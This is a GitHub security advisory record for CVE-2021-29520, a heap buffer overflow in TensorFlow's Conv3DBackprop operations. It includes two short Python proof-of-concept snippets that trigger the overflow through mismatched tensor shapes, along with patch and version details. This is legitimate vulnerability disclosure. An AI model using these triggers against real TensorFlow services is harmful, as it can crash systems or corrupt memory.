{
    "ghsaId": "GHSA-wcv5-qrj6-9pfm",
    "severity": "LOW",
    "summary": "Heap buffer overflow in `Conv3DBackprop*`",
    "description": "### Impact\nMissing validation between arguments to `tf.raw_ops.Conv3DBackprop*` operations can result in heap buffer overflows:\n\n```python\nimport tensorflow as tf\n\ninput_sizes = tf.constant([1, 1, 1, 1, 2], shape=[5], dtype=tf.int32)\nfilter_tensor = tf.constant([734.6274508233133, -10.0, -10.0, -10.0, -10.0, -10.0, -10.0,\n                            -10.0, -10.0, -10.0, -10.0, -10.0, -10.0, -10.0, -10.0, -10.0,\n                            -10.0, -10.0, -10.0, -10.0, -10.0, -10.0, -10.0, -10.0], shape=[4, 1, 6, 1, 1], dtype=tf.float32)\nout_backprop = tf.constant([-10.0], shape=[1, 1, 1, 1, 1], dtype=tf.float32)\n\ntf.raw_ops.Conv3DBackpropInputV2(input_sizes=input_sizes, filter=filter_tensor, out_backprop=out_backprop, strides=[1, 89, 29, 89, 1], padding='SAME', data_format='NDHWC', dilations=[1, 1, 1, 1, 1])\n```\n```python\nimport tensorflow as tf\n\ninput_values = [-10.0] * (7 * 7 * 7 * 7 * 7)\ninput_values[0] = 429.6491056791816\ninput_sizes = tf.constant(input_values, shape=[7, 7, 7, 7, 7], dtype=tf.float32)\nfilter_tensor = tf.constant([7, 7, 7, 1, 1], shape=[5], dtype=tf.int32)\nout_backprop = tf.constant([-10.0, -10.0, -10.0, -10.0, -10.0, -10.0, -10.0], shape=[7, 1, 1, 1, 1], dtype=tf.float32)\n  \ntf.raw_ops.Conv3DBackpropFilterV2(input=input_sizes, filter_sizes=filter_tensor, out_backprop=out_backprop, strides=[1, 37, 65, 93, 1], padding='VALID', data_format='NDHWC', dilations=[1, 1, 1, 1, 1])\n```\n\nThis is because the [implementation](https://github.com/tensorflow/tensorflow/blob/4814fafb0ca6b5ab58a09411523b2193fed23fed/tensorflow/core/kernels/conv_grad_shape_utils.cc#L94-L153) assumes that the `input`, `filter_sizes` and `out_backprop` tensors have the same shape, as they are accessed in parallel.\n\n### Patches\nWe have patched the issue in GitHub commit [8f37b52e1320d8d72a9529b2468277791a261197](https://github.com/tensorflow/tensorflow/commit/8f37b52e1320d8d72a9529b2468277791a261197).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our securityguide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu X-Team.",
    "permalink": "https://github.com/advisories/GHSA-wcv5-qrj6-9pfm",
    "publishedAt": "2021-05-21T14:21:12Z",
    "withdrawnAt": null,
    "identifiers": [
        {
            "type": "GHSA",
            "value": "GHSA-wcv5-qrj6-9pfm"
        },
        {
            "type": "CVE",
            "value": "CVE-2021-29520"
        }
    ]
}